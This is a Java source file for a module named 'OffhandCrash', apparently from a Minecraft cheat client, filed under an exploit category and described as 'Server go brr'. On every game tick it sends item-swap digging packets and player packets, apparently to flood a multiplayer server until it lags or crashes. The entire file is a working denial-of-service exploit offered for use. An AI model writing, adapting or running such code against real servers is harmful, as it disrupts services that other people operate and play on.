package me.zihasz.zware.impl.module.exploit;

import me.zihasz.zware.api.module.Module;
import me.zihasz.zware.api.util.Message;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;

public class OffhandCrash extends Module {

    public OffhandCrash() {
        super("OffhandCrash", "Server go brr", Category.EXPLOIT);
    }

    @Override
    public void onEnable() {
        if (nullCheck()) return;
        Message.sendModuleMessage(getName(), "Enabling");
    }

    @Override
    public void onUpdate() {
        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
        mc.player.connection.sendPacket(new CPacketPlayer(true));
    }

    @Override
    public void onDisable() {
        Message.sendModuleMessage(getName(), "Disabling");
    }
}
